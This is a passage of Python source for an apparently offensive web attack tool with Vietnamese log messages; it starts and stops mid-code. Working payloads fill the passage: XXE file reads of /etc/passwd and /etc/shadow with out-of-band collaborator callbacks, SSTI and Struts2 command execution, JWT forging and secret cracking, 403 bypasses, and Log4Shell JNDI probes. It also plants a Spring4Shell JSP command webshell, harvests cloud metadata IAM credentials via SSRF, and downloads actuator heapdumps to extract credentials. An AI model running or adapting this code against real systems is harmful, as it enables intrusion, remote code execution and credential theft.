                engine.findings.append({"url": action, "param": f"form#{i}", "type": "csrf-novalidate",
                                        "method": method, "payload": f"status={r2.status_code}"})
    log("CSRF check xong.", "OK")

# ============================================================
#                    MODULE: XXE ADVANCED
# ============================================================
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///etc/passwd">]><root>&x;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]><root>&x;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % p SYSTEM "http://COLLAB/xxe.dtd">%p;]><root/>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><root>&x;</root>',
    '<!DOCTYPE root [<!ENTITY % a "file:///etc/passwd"><!ENTITY % b "<!ENTITY &#x25; c SYSTEM \'http://COLLAB/?%a;\'>">%b;%c;]>',
    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
]

def xxe_scan(engine, collab=None):
    log("=== XXE SCANNER ===", "XXE")
    if not collab:
        collab = input("Collaborator URL (Enter = skip OOB): ").strip()
    targets = engine.extract_params()
    for t in targets:
        for raw in XXE_PAYLOADS:
            pl = raw.replace("COLLAB", collab or "127.0.0.1:9999")
            if t["method"] == "POST":
                r = engine.req(t["url"], data=pl, method="POST",
                               headers={"Content-Type": "application/xml"})
            else:
                r = engine.inject(t, pl)
            if r and (re.search(r"root:x:0:0:|\[extensions\]|root:\*:", r.text)):
                log(f"[!] XXE: {t['param']} → LFI", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "xxe",
                                        "payload": pl[:80], "method": t["method"]})
                break
    log("XXE scan xong.", "OK")

# ============================================================
#                    MODULE: SSTI
# ============================================================
SSTI_PAYLOADS = [
    ("{{7*7}}", "49"), ("${7*7}", "49"), ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"), ("#{7*7}", "49"), ("*{7*7}", "49"),
    ("{{config}}", "Config"), ("{{self}}", "TemplateReference"),
    ("@(7*7)", "49"), ("{{'7'*7}}", "7777777"),
    ("{{ ''.__class__.__mro__[2].__subclasses__() }}", "__subclasses__"),
    ("{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}", "root:"),
    ("${T(java.lang.Runtime).getRuntime().exec('id')}", "uid="),
    ("${{<%[%'\"}}%\\", "TemplateSyntaxError"),
    ("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "uid="),
]

def ssti_scan(engine):
    log("=== SSTI SCANNER ===", "SSTI")
    targets = engine.extract_params()
    for t in targets:
        for pl, expect in SSTI_PAYLOADS:
            r = engine.inject(t, pl)
            if r and expect in r.text and pl not in r.text:
                log(f"[!] SSTI: {t['param']} → {pl[:60]} (kết quả: {expect})", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "ssti",
                                        "payload": pl, "method": t["method"]})
                break
    log("SSTI scan xong.", "OK")

# ============================================================
#                    MODULE: NoSQL
# ============================================================
NOSQL_PAYLOADS = [
    ("username[$ne]=x&password[$ne]=x", "bypass"),
    ("username[$gt]=&password[$gt]=", "bypass"),
    ("username[$regex]=.*&password[$regex]=.*", "regex"),
    ("{\"username\":{\"$ne\":\"x\"},\"password\":{\"$ne\":\"x\"}}", "json"),
    ("username=admin&password[$ne]=x", "mixed"),
    ("username[$ne]=admin&password[$ne]=admin", "bypass2"),
    ("{\"$where\":\"1==1\"}", "where"),
    ("username=admin'||'1'=='1&password=x", "mongo-op"),
]

def nosql_scan(engine):
    log("=== NoSQL INJECTION SCANNER ===", "NoSQL")
    targets = engine.extract_params()
    login_params = [t for t in targets if re.search(r"user|login|email|pass|account|name", t["param"], re.I)]
    if not login_params: login_params = targets
    for t in login_params:
        for payload, kind in NOSQL_PAYLOADS:
            if "$" in payload and t["method"] == "POST":
                r = engine.req(t["url"], data=payload, method="POST")
            else:
                r = engine.inject(t, payload)
            if r and r.status_code in (200, 302) and \
               not re.search(r"invalid|incorrect|wrong|fail|error", r.text, re.I):
                log(f"[!] NoSQL: {t['param']} → {kind}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "nosql",
                                        "payload": payload, "method": t["method"]})
                break
    log("NoSQL scan xong.", "OK")

# ============================================================
#                    MODULE: JWT ADVANCED
# ============================================================
def jwt_decode(token):
    try:
        parts = token.split(".")
        if len(parts) != 3: return None
        hdr = json.loads(base64.urlsafe_b64decode(parts[0] + "=="*3))
        pay = json.loads(base64.urlsafe_b64decode(parts[1] + "=="*3))
        return {"header": hdr, "payload": pay, "signature": parts[2]}
    except Exception: return None

JWT_SECRETS = ["secret","password","123456","jwt","admin","key","test","jwtsecret",
               "mysecret","your-256-bit-secret","changeme","secretkey","supersecret",
               "keyboard cat","hs256","hs512","token","bearer","auth","api","jwtkey",
               "secret123","password123","admin123","root","toor","letmein","qwerty",
               "abcdefghijklmnop","0123456789","myJWTsecret","jwt_secret","JWTSecret"]

def jwt_scan(engine):
    log("=== JWT ATTACKS (Advanced) ===", "JWT")
    token = input("Nhập JWT token: ").strip()
    decoded = jwt_decode(token)
    if not decoded:
        log("Token không hợp lệ.", "WARN"); return
    log(f"Header: {decoded['header']}", "OK")
    log(f"Payload: {json.dumps(decoded['payload'])[:300]}", "OK")
    alg = decoded["header"].get("alg", "").upper()
    if alg == "NONE":
        log("[!] JWT alg=none — dễ bypass!", "VULN")
    # Test alg=none
    none_hdr = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
    none_pay = base64.urlsafe_b64encode(json.dumps(decoded["payload"]).encode()).rstrip(b"=").decode()
    none_tok = f"{none_hdr}.{none_pay}."
    log(f"alg=none token: {none_tok[:80]}...", "OK")
    # Brute weak secrets
    for sec in JWT_SECRETS:
        for algo, h in [("HS256", hashlib.sha256), ("HS384", hashlib.sha384), ("HS512", hashlib.sha512)]:
            sig = base64.urlsafe_b64encode(
                hmac.new(sec.encode(), f"{none_hdr}.{none_pay}".encode(), h).digest()
            ).rstrip(b"=").decode()
            if sig == decoded["signature"]:
                log(f"[!] JWT SECRET FOUND: '{sec}' ({algo})", "VULN")
                engine.findings.append({"url": "jwt", "param": f"alg={algo}", "type": "jwt-brute",
                                        "payload": sec, "method": "-"})
                return
    log("Không crack được secret.", "WARN")

# ============================================================
#                    MODULE: GraphQL
# ============================================================
def graphql_scan(engine):
    log("=== GRAPHQL SCANNER ===", "GRAPHQL")
    endpoints = ["/graphql","/graphiql","/api/graphql","/v1/graphql","/query","/gql","/graph","/graphql/v1","/api/v1/graphql","/api/gql"]
    for ep in endpoints:
        url = urljoin(engine.url, ep)
        try:
            r = engine.req(url, data='{"query":"{__schema{types{name}}}"}', method="POST",
                           headers={"Content-Type": "application/json"})
            if r and ("__schema" in r.text or "types" in r.text):
                log(f"[!] GraphQL: {url}", "VULN")
                # Full introspection
                r2 = engine.req(url, data='{"query":"query IntrospectionQuery{__schema{queryType{name} mutationType{name} types{name kind fields{name args{name type{name kind}}}}}}"}',
                                method="POST", headers={"Content-Type": "application/json"})
                if r2 and "queryType" in r2.text:
                    log("Introspection đầy đủ OK!", "VULN")
                    path = os.path.join(REPORT_DIR, f"graphql_schema_{int(time.time())}.json")
                    with open(path, "w") as f: f.write(r2.text)
                    log(f"Schema: {path}", "OK")
                engine.findings.append({"url": url, "param": "-", "type": "graphql",
                                        "payload": "introspection enabled", "method": "POST"})
        except Exception: pass
    log("GraphQL scan xong.", "OK")

# ============================================================
#                    MODULE: CORS / CRLF / REDIRECT / HOST
# ============================================================
def cors_scan(engine):
    log("=== CORS MISCONFIG ===", "CORS")
    origins = ["http://evil.com","null","https://attacker.io","http://localhost","https://evil.com",
               "http://evil.com:80","http://" + rand_marker() + ".evil.com"]
    for orig in origins:
        r = engine.req(engine.url, headers={"Origin": orig})
        if r:
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "").lower()
            if acao == orig and acac == "true":
                log(f"[!] CORS: reflect {orig} + creds", "VULN")
                engine.findings.append({"url": engine.url, "param": "Origin", "type": "cors",
                                        "payload": f"{orig} + creds=true", "method": "GET"})
            elif acao == "*" and acac == "true":
                log("[!] CORS wildcard + creds!", "VULN")
                engine.findings.append({"url": engine.url, "param": "Origin", "type": "cors",
                                        "payload": "* + creds", "method": "GET"})
    log("CORS xong.", "OK")

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:crlf=injected","%0d%0aX-Injected:crlf","\r\nSet-Cookie: crlf=injected",
    "%0aSet-Cookie:crlf=injected","%0d%0aLocation:http://evil.com","%0d%0a%0d%0a<html>CRLF",
]

def crlf_scan(engine):
    log("=== CRLF INJECTION ===", "CRLF")
    targets = engine.extract_params()
    for t in targets:
        for pl in CRLF_PAYLOADS:
            r = engine.inject(t, pl)
            if r and ("crlf=injected" in str(r.headers) or "X-Injected" in str(r.headers)
                      or "evil.com" in r.headers.get("Location", "")):
                log(f"[!] CRLF: {t['param']} → {pl[:40]}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "crlf",
                                        "payload": pl, "method": t["method"]})
                break
    log("CRLF xong.", "OK")

REDIR_PARAMS = re.compile(r"redirect|url|next|return|goto|redir|dest|continue|target|callback|r|u|to|out|link|view", re.I)
REDIR_PAYLOADS = ["//evil.com","http://evil.com","https://evil.com","//google.com",
                  "//evil.com/%2F..","https://evil.com@legit.com","//evil.com#@legit.com",
                  "http:////evil.com","https:////evil.com","/%09/evil.com","/%5cevil.com",
                  "\\\\evil.com","//evil.com/%0d%0a"]

def open_redirect_scan(engine):
    log("=== OPEN REDIRECT ===", "REDIR")
    targets = engine.extract_params()
    for t in targets:
        if not REDIR_PARAMS.search(t["param"]): continue
        for pl in REDIR_PAYLOADS:
            inj = engine.inject(t, pl)
            if not inj: continue
            r = engine.req(inj.url if hasattr(inj, 'url') else engine.url, allow_redirects=False)
            if r and r.status_code in (301,302,303,307,308):
                loc = r.headers.get("Location", "")
                if "evil.com" in loc or "google.com" in loc:
                    log(f"[!] OPEN REDIRECT: {t['param']} → {pl}", "VULN")
                    engine.findings.append({"url": t["url"], "param": t["param"], "type": "open_redirect",
                                            "payload": pl, "method": t["method"]})
                    break
    log("Open redirect xong.", "OK")

def host_header_scan(engine):
    log("=== HOST HEADER INJECTION ===", "HOST")
    tests = [("Host","evil.com"),("X-Forwarded-Host","evil.com"),("X-Forwarded-For","127.0.0.1"),
             ("X-Original-URL","/admin"),("X-Rewrite-URL","/admin"),("X-Host","evil.com"),
             ("X-Forwarded-Server","evil.com"),("Forwarded","host=evil.com")]
    for h, v in tests:
        r = engine.req(engine.url, headers={h: v})
        if r and (v in r.text or "evil.com" in r.text):
            log(f"[!] HOST: {h}={v} reflected", "VULN")
            engine.findings.append({"url": engine.url, "param": h, "type": "host_header",
                                    "payload": v, "method": "GET"})
    log("Host header xong.", "OK")

# ============================================================
#                    MODULE: 403 BYPASS
# ============================================================
BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},{"X-Rewrite-URL": "/admin"},{"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},{"X-Remote-IP": "127.0.0.1"},{"X-Client-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},{"X-Host": "localhost"},{"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded": "127.0.0.1"},{"Forwarded-For": "127.0.0.1"},{"X-Real-IP": "127.0.0.1"},
    {"Referer": "/admin"},{"X-ProxyUser-Ip": "127.0.0.1"},{"Base-Url": "127.0.0.1"},
]
BYPASS_PATHS = ["/admin/","/admin/..;/","/./admin","//admin","/%2e/admin","/admin%20","/admin..;/",
                "/admin/.","/admin/..","/admin/./","/ADMIN","/Admin","/admin%2f","/admin;/",
                "/%2e%2e/admin","/admin%00","/admin#","/admin?"]

def bypass_403(engine):
    log("=== 403 BYPASS ===", "WAF")
    url = input("URL bị 403: ").strip()
    if not url: return
    if not url.startswith("http"): url = engine.url.rstrip("/") + "/" + url.lstrip("/")
    base = engine.req(url)
    if base and base.status_code != 403:
        log(f"URL không 403 (status={base.status_code}).", "WARN"); return
    log("Base 403 — thử bypass...", "OK")
    for h in BYPASS_HEADERS:
        r = engine.req(url, headers=h)
        if r and r.status_code not in (403, 404):
            log(f"[!] BYPASS header {list(h.keys())[0]} → {r.status_code}", "VULN")
    for p in BYPASS_PATHS:
        r = engine.req(url.rstrip("/") + p)
        if r and r.status_code not in (403, 404):
            log(f"[!] BYPASS path {p} → {r.status_code}", "VULN")

# ============================================================
#                    MODULE: DIRECTORY FUZZ MASSIVE
# ============================================================
COMMON_DIRS = [
    "admin","administrator","login","wp-admin","phpmyadmin","backup",".git","config","db","sql",
    "test","dev","uploads",".env","robots.txt",".htaccess","server-status","console","dashboard",
    "user","install","setup","old",".svn","composer.json","web.config","crossdomain.xml","sitemap.xml",
    ".DS_Store","id_rsa","debug","api","v1","v2","v3","swagger","docs","graphql","metrics","health",
    "status","phpinfo.php","info.php","adminer.php","shell.php","cgi-bin","vendor",".htpasswd",".ssh",
    "passwd","shadow","auth","oauth","token","jwt","secret","private","internal","hidden","portal",
    "manage","management","panel","control","cp","webadmin","adminpanel","adm","root","superuser",
    "backup.zip","backup.tar.gz","backup.sql","dump.sql","database.sql","db.sql","data.sql",
    "wp-config.php.bak","wp-config.php~","config.php.bak","config.old",".git/config",".git/HEAD",
    ".env.local",".env.prod",".env.backup","credentials","credentials.txt","passwords.txt",
    "id_rsa.pub","authorized_keys","known_hosts",".bash_history",".zsh_history",
    "phpinfo","test.php","info.php","admin.php","login.php","register.php","signup.php",
    "readme.md","README.md","CHANGELOG.md","LICENSE","VERSION",".npmrc",".dockerignore",
    "Dockerfile","docker-compose.yml","jenkins","jenkins.xml","sonar","nexus","artifactory",
    "grafana","prometheus","kibana","elasticsearch","solr","rabbitmq","redis","memcached",
]
DIR_EXTS = ["", ".php", ".bak", ".old", ".txt", ".zip", ".sql", ".tar.gz", ".json", ".xml",
            ".html", ".htm", ".asp", ".aspx", ".jsp", ".do", ".action", ".py", ".rb", ".sh",
            ".conf", ".config", ".log", ".swp", ".save", "~"]

def dir_fuzz(engine, threads=50):
    log("=== DIRECTORY FUZZ (Massive) ===", "DIR")
    u = urlparse(engine.url)
    root = f"{u.scheme}://{u.netloc}"
    base = engine.req(root)
    base_status = base.status_code if base else 404
    found = []
    def probe(path):
        try:
            r = engine.s.get(f"{root}/{path}", timeout=5, allow_redirects=False, headers=rot_ua())
            if r.status_code in (200, 201, 301, 302, 401, 403, 500) and r.status_code != base_status:
                return (path, r.status_code, len(r.text))
        except Exception: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(probe, d + e) for d in COMMON_DIRS for e in DIR_EXTS]
        for f in concurrent.futures.as_completed(futs):
            res = f.result()
            if res:
                path, code, size = res
                color = C['R'] if code in (200, 401, 403) else C['Y']
                print(f"  {color}[{code}]{C['W']} {root}/{path}  ({size}b)")
                found.append((path, code))
                if code == 200:
                    engine.findings.append({"url": f"{root}/{path}", "param": "-", "type": "dir", "method": "GET"})
    log(f"Dir fuzz: {len(found)} paths.", "OK")
    return found

# ============================================================
#                    MODULE: API DISCOVERY
# ============================================================
API_ENDPOINTS = [
    "/api","/api/v1","/api/v2","/api/v3","/rest","/graphql","/swagger","/swagger.json",
    "/swagger-ui","/swagger-ui.html","/openapi.json","/api-docs","/docs","/redoc",
    "/api/v1/users","/api/v1/login","/api/v1/admin","/api/v1/health","/api/v1/status",
    "/api/v1/version","/api/v1/config","/api/v1/token","/api/v1/me","/api/v1/auth",
    "/api/v1/register","/api/v1/profile","/api/v1/user","/api/v1/users/me","/api/v1/search",
    "/api/v1/upload","/api/v1/download","/api/v1/export","/api/v1/import","/api/v1/webhooks",
    "/api/users","/api/login","/api/admin","/api/health","/api/status","/api/version",
    "/api/me","/api/auth","/api/register","/api/profile","/api/search","/api/upload",
    "/.well-known/openid-configuration","/.well-known/security.txt","/.well-known/jwks.json",
    "/actuator","/actuator/health","/actuator/env","/actuator/beans","/actuator/mappings",
    "/actuator/heapdump","/actuator/trace","/actuator/loggers","/actuator/configprops",
    "/health","/healthz","/metrics","/prometheus","/debug","/env","/info","/trace",
]

def api_scan(engine):
    log("=== API DISCOVERY ===", "API")
    found = []
    for ep in API_ENDPOINTS:
        url = urljoin(engine.url, ep)
        r = engine.req(url)
        if r and r.status_code in (200, 201, 202, 204, 400, 401, 403, 405, 500):
            ct = r.headers.get("Content-Type", "")
            size = len(r.text)
            log(f"[{r.status_code}] {url} ({ct}) {size}b", "OK")
            found.append(url)
            if r.status_code == 200 and ("json" in ct or "xml" in ct):
                engine.findings.append({"url": url, "param": "-", "type": "api",
                                        "payload": f"ct={ct}", "method": "GET"})
                # Nếu actuator heapdump
                if "heapdump" in ep:
                    log(f"[!] ACTUATOR HEAPDUMP exposed — download & extract creds!", "VULN")
                    try:
                        dump = engine.req(url)
                        if dump and dump.status_code == 200:
                            path = os.path.join(REPORT_DIR, f"heapdump_{int(time.time())}.bin")
                            with open(path, "wb") as f: f.write(dump.content)
                            log(f"Đã lưu: {path}", "OK")
                    except Exception: pass
    log(f"API: {len(found)} endpoints.", "OK")

# ============================================================
#                    MODULE: PORT SCAN
# ============================================================
def port_scan(engine, target=None):
    log("=== PORT SCAN (Aggressive) ===", "NMAP")
    host = target or urlparse(engine.url).netloc.split(":")[0]
    try: host = socket.gethostbyname(host)
    except Exception: log(f"Không resolve: {host}", "WARN"); return
    if tool_exists("nmap"):
        subprocess.run(["nmap","-sV","-sC","-T4","-p-","--open",host])
    else:
        ports = list(range(1,1025)) + [1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,27017,50000]
        def scan(p):
            s = socket.socket(); s.settimeout(0.5)
            if s.connect_ex((host, p)) == 0:
                print(f"  {C['R']}[OPEN]{C['W']} {host}:{p}")
            s.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:
            list(ex.map(scan, ports))

# ============================================================
#                    MODULE: SUBDOMAIN + TAKEOVER
# ============================================================
SUBS = ["www","mail","ftp","admin","portal","vpn","dev","test","staging","api","blog","shop",
        "cpanel","webmail","ns1","ns2","remote","git","jenkins","db","cloud","app","intranet",
        "m","mobile","static","cdn","img","images","assets","files","download","support",
        "help","docs","wiki","forum","community","store","beta","alpha","demo","sandbox",
        "login","logout","auth","sso","oauth","smtp","pop","imap","mx","dns","ldap","radius",
        "monitor","status","health","backup","backups","bak","old","new","test1","test2",
        "dev1","dev2","stage","production","prod","preprod","qa","uat","integration","internal",
        "private","public","secure","ssl","tls","gateway","proxy","router","switch","firewall"]

TAKEOVER_SIGS = {
    "github.io": "There isn't a GitHub Pages site here",
    "herokuapp.com": "No such app",
    "s3.amazonaws.com": "NoSuchBucket",
    "cloudfront.net": "Bad request",
    "azurewebsites.net": "404 Web Site not found",
    "wordpress.com": "Do you want to register",
    "shopify.com": "Sorry, this shop is currently unavailable",
    "fastly.net": "Fastly error: unknown domain",
    "ghost.io": "Domain error",
    "surge.sh": "project not found",
    "bitbucket.io": "Repository not found",
    "readthedocs.io": "unknown to Read the Docs",
    "zendesk.com": "Help Center Closed",
    "desk.com": "This page is taking too long to load",
    "tumblr.com": "There's nothing here",
    "pantheonsite.io": "The gods are angry",
    "helpscoutdocs.com": "No settings were found",
    "cargo.site": "If you're moving your domain away",
    "statuspage.io": "You are being redirected",
    "smugmug.com": "Page Not Found",
    "teamwork.com": "Oops - We didn't find your site",
    "uservoice.com": "This UserVoice subdomain is currently available",
    "intercom.help": "This page is reserved for artistic types",
    "feedpress.me": "The feed has not been found",
}

def subdomain_enum(engine, takeover=True):
    log("=== SUBDOMAIN ENUM + TAKEOVER ===", "SUB")
    host = urlparse(engine.url).netloc.split(":")[0]
    parts = host.split(".")
    if len(parts) < 2: log("Domain không hợp lệ.", "WARN"); return
    base_domain = ".".join(parts[-2:])
    found = []
    def check(sub):
        fqdn = f"{sub}.{base_domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            return (fqdn, ip)
        except socket.gaierror: return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for r in ex.map(check, SUBS):
            if r:
                log(f"FOUND: {r[0]} → {r[1]}", "OK")
                found.append(r)
                engine.findings.append({"url": r[0], "param": r[1], "type": "subdomain", "method": "-"})
                if takeover:
                    # Check takeover
                    try:
                        rr = requests.get(f"http://{r[0]}", timeout=5, verify=False)
                        for svc, sig in TAKEOVER_SIGS.items():
                            if sig.lower() in rr.text.lower():
                                log(f"[!] SUBDOMAIN TAKEOVER: {r[0]} ({svc})", "TAKEOVER")
                                engine.findings.append({"url": r[0], "param": svc,
                                                        "type": "subdomain_takeover",
                                                        "payload": sig, "method": "GET"})
                    except Exception: pass
    if not found: log("Không tìm thấy subdomain.", "WARN")
    return found

# ============================================================
#                    MODULE: CMS DETECT
# ============================================================
def cms_scan(engine):
    log("=== CMS / TECH DETECTION ===", "INFO")
    r = engine.req(engine.url)
    if not r: return
    html = r.text.lower()
    headers = {k.lower(): v for k, v in r.headers.items()}
    sigs = {
        "WordPress": ["wp-content","wp-json","wp-includes","/wp-admin/"],
        "Joomla": ["joomla","/components/com_","/modules/mod_"],
        "Drupal": ["drupal","/sites/default/","drupal-settings-json"],
        "Magento": ["magento","mage/cookies","/skin/frontend/"],
        "PrestaShop": ["prestashop","/modules/ps_"],
        "phpBB": ["phpbb","/styles/prosilver/"],
        "Laravel": ["laravel_session","XSRF-TOKEN"],
        "Django": ["csrftoken","django"],
        "Flask": ["flask","werkzeug"],
        "Express": ["express"],
        "ASP.NET": ["asp.net","__viewstate","__eventvalidation"],
        "PHP": [".php"],
        "Node.js": ["node","express"],
        "Ruby on Rails": ["rails","_rails_session"],
        "Spring": ["jsessionid","spring"],
        "Tomcat": ["tomcat","coyote"],
    }
    detected = []
    for name, pats in sigs.items():
        for p in pats:
            if p in html or p in str(headers):
                log(f"CMS/Tech: {name}", "VULN")
                detected.append(name); break
    if "x-powered-by" in headers: log(f"X-Powered-By: {headers['x-powered-by']}", "OK")
    if "server" in headers: log(f"Server: {headers['server']}", "OK")
    # Sensitive files
    for p in ["readme.html","wp-includes/js/version.js","CHANGELOG.txt",".env","robots.txt",
              "sitemap.xml",".git/HEAD","package.json","composer.json"]:
        rr = engine.s.get(urljoin(engine.url, p), timeout=5, headers=rot_ua())
        if rr.status_code == 200 and len(rr.text) > 30:
            log(f"Sensitive file: {p} (200)", "WARN")
            engine.findings.append({"url": urljoin(engine.url, p), "param": "-",
                                    "type": "sensitive_file", "method": "GET"})
    return detected

# ============================================================
#                    MODULE: SSL/TLS
# ============================================================
def ssl_scan(engine):
    log("=== SSL/TLS ANALYSIS ===", "SSL")
    u = urlparse(engine.url)
    if u.scheme != "https": log("Không phải HTTPS.", "WARN"); return
    host, port = u.hostname, (u.port or 443)
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                log(f"Protocol: {ssock.version()}", "OK")
                log(f"Cipher: {ssock.cipher()}", "OK")
                log(f"Subject: {dict(x[0] for x in cert['subject'])}", "OK")
                log(f"Issuer: {dict(x[0] for x in cert['issuer'])}", "OK")
                log(f"Expires: {cert['notAfter']}", "OK")
                if "TLSv1.1" in str(ssock.version()) or "TLSv1 " in str(ssock.version()):
                    log("[!] TLS cũ!", "VULN")
    except Exception as e: log(f"SSL error: {e}", "WARN")

# ============================================================
#                    MODULE: CVE PROBES
# ============================================================
def log4shell_probe(engine, collab=None):
    """Log4Shell (CVE-2021-44228)"""
    log("=== Log4Shell CVE-2021-44228 ===", "LOG4J")
    if not collab: collab = input("LDAP/HTTP collaborator (Enter=skip): ").strip()
    if not collab: return
    payloads = [
        f"${{jndi:ldap://{collab}/a}}",
        f"${{jndi:ldap://{collab}/${{sys:java.version}}}}",
        f"${{jndi:dns://{collab}/a}}",
        f"${{${{lower:j}}ndi:l${{lower:d}}ap://{collab}/a}}",
        f"${{${{upper:j}}ndi:${{upper:l}}dap://{collab}/a}}",
        f"${{jndi:${{lower:l}}dap://{collab}/a}}",
    ]
    headers_to_test = ["User-Agent","X-Api-Version","X-Forwarded-For","X-Client-IP","Referer",
                       "Origin","Cookie","X-Druid-Comment","X-Requested-With"]
    for p in payloads:
        engine.req(engine.url, headers={"User-Agent": p})
        for h in headers_to_test:
            engine.req(engine.url, headers={h: p})
        # Param
        if engine.current:
            engine.send(p)
        # URL param
        u = engine.url
        if "?" in u:
            engine.req(u + "&x=" + quote(p))
        log(f"Sent: {p[:50]}", "LOG4J")
    log("Log4Shell probe xong — check collaborator.", "OK")

def spring4shell_probe(engine):
    """Spring4Shell (CVE-2022-22965)"""
    log("=== Spring4Shell CVE-2022-22965 ===", "SPRING")
    payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:
        r = engine.req(engine.url + "?" + payload, headers={
            "suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1",
            "Content-Type": "application/x-www-form-urlencoded"
        })
        log(f"Spring4Shell sent (status={r.status_code if r else 'N/A'})", "SPRING")
    except Exception as e: log(f"Lỗi: {e}", "WARN")

def shellshock_probe(engine):
    """Shellshock (CVE-2014-6271)"""
    log("=== Shellshock CVE-2014-6271 ===", "SHELLSHOCK")
    payloads = [
        "() { :;}; /bin/bash -c 'id'",
        "() { :;}; echo vulnerable",
        "() { :;}; /bin/bash -c 'cat /etc/passwd'",
    ]
    for p in payloads:
        r = engine.req(engine.url, headers={"User-Agent": p, "Referer": p, "Cookie": p})
        if r and ("uid=" in r.text or "root:" in r.text or "vulnerable" in r.text):
            log(f"[!] SHELLSHOCK VULNERABLE!", "VULN")
            engine.findings.append({"url": engine.url, "param": "User-Agent", "type": "shellshock",
                                    "payload": p, "method": "GET"})
            break
    log("Shellshock probe xong.", "OK")

def struts2_probe(engine):
    """Struts2 OGNL RCE (S2-045, S2-046, S2-057)"""
    log("=== Struts2 OGNL RCE ===", "STRUTS")
    payloads = [
        "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
    ]
    for p in payloads:
        r = engine.req(engine.url, headers={"Content-Type": p})
        if r and "uid=" in r.text:
            log(f"[!] STRUTS2 RCE!", "VULN")
            engine.findings.append({"url": engine.url, "param": "Content-Type", "type": "struts2-rce",
                                    "payload": p[:60], "method": "POST"})
            break
    log("Struts2 probe xong.", "OK")

# ============================================================
#                    MODULE: CLOUD METADATA
# ============================================================
def cloud_metadata_scan(engine):
    log("=== CLOUD METADATA HARVEST ===", "CLOUD")
    targets = engine.extract_params()
    ssrf_t = [t for t in targets if re.search(r"url|src|path|fetch|load|img|redirect|uri|file", t["param"], re.I)]
    if not ssrf_t: ssrf_t = targets
    endpoints = [
        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("AWS", "http://169.254.169.254/latest/user-data/"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/"),
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("Azure", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1.json"),
        ("Alibaba", "http://100.100.100.200/latest/meta-data/"),
        ("Oracle", "http://192.0.0.192/latest/meta-data/"),
    ]
    for cloud, url in endpoints:
        for t in ssrf_t[:3]:
            r = engine.inject(t, url)
            if r and r.status_code == 200 and len(r.text) > 50:
                log(f"[!] {cloud} METADATA: {t['param']}", "CLOUD")
                log(f"    {url}", "OK")
                print(r.text[:500])
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "cloud_metadata",
